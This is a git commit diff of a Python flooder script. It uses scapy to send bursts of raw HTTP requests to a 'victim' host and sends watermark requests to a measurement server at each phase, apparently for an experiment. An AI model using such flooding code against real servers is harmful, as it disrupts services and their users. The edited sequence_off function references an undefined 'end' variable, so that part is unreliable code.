367c479a3e57e4a16573bac9551653b32ddd1595
John@Doe.org <sinnan.suleman@daraz.pk>
2022-12-01 12:44:23 +0500

    Flooder + Measurement + Server

--- Flooder/main.py
+++ Flooder/main.py
@@ -14,15 +14,7 @@ burst="""GET /json HTTP/1.1
  Accept-Language: en-US,en;q=0.5
  Connection: keep-alive"""
 
-watermark_burst="""GET /burst HTTP/1.1
- Host: %s
- User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20130501 Firefox/30.0 AppleWebKit/600.00 Chrome/30.0.0000.0 Trident/10.0 Safari/600.00
- Cookie: uid=12345678901234567890; __utma=1.1234567890.1234567890.1234567890.1234567890.12; wd=2560x1600
- Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
- Accept-Language: en-US,en;q=0.5
- Connection: keep-alive"""
-
-watermark_idle="""GET /idle HTTP/1.1
+watermark="""GET %s HTTP/1.1
  Host: %s
  User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20130501 Firefox/30.0 AppleWebKit/600.00 Chrome/30.0.0000.0 Trident/10.0 Safari/600.00
  Cookie: uid=12345678901234567890; __utma=1.1234567890.1234567890.1234567890.1234567890.12; wd=2560x1600
@@ -34,7 +26,6 @@ watermark_idle="""GET /idle HTTP/1.1
 # generate a request
 ###########################################
 def send_request(host,port,raw_payload):
-	print("flooding")
 	payload=raw_payload%(host)
 	syn=IP(dst=host)/TCP(dport=port,flags='S')
 	syn_ack = sr1(syn,verbose=0)
@@ -48,8 +39,11 @@ def send_request(host,port,raw_payload):
 def sequence_on(p):
 	end=time.time()+p
 
+	send_request(measure,port,watermark%("/On/Start","%s"))
+	
 	# notify measurement process of the burst start
-	send_request(measure,port,watermark_burst)
+	send_request(measure,port,watermark%("/On/Burst","%s"))
+	print("flooding")
 	
 	# send bursts to victim, each burst lasts for p seconds
 	while(time.time()<end):
@@ -57,34 +51,37 @@ def sequence_on(p):
 		t.start()
 
 	# notify measurement process that the burst is over
-	send_request(measure,port,watermark_burst)
+	send_request(measure,port,watermark%("/On/Idle","%s"))
 	print("iteration complete")
 	
 	# the burst is repeated after 10-p seconds
 	time.sleep(10-p)
 	
 	# notify measurement process that the test iteration is over
-	send_request(measure,port,watermark_burst)
+	send_request(measure,port,watermark%("/On/Iteration","%s"))
 
 ###########################################
 # idle for d seconds
 ###########################################
 def sequence_off(p):
 	
+	send_request(measure,port,watermark%("/Off/Start","%s"))
+
 	# notify measurement process of the idle start
-	send_request(measure,port,watermark)
+	send_request(measure,port,watermark%("/Off/Noise","%s"))
 	
 	# do nothing
-	time.sleep(p)
+	while(time.time()<end):
+		1
 	
 	# notify measurement process that the idle is over
-	send_request(measure,port,watermark)
+	send_request(measure,port,watermark%("/Off/Idle","%s"))
 	
 	# the burst is repeated after 10-p seconds
 	time.sleep(10-p)
 
 	# notify measurement process that the test iteration is over
-	send_request(measure,port,watermark)
+	send_request(measure,port,watermark%("/Off/Iteration","%s"))
 
 ###########################################
 # run till N seconds
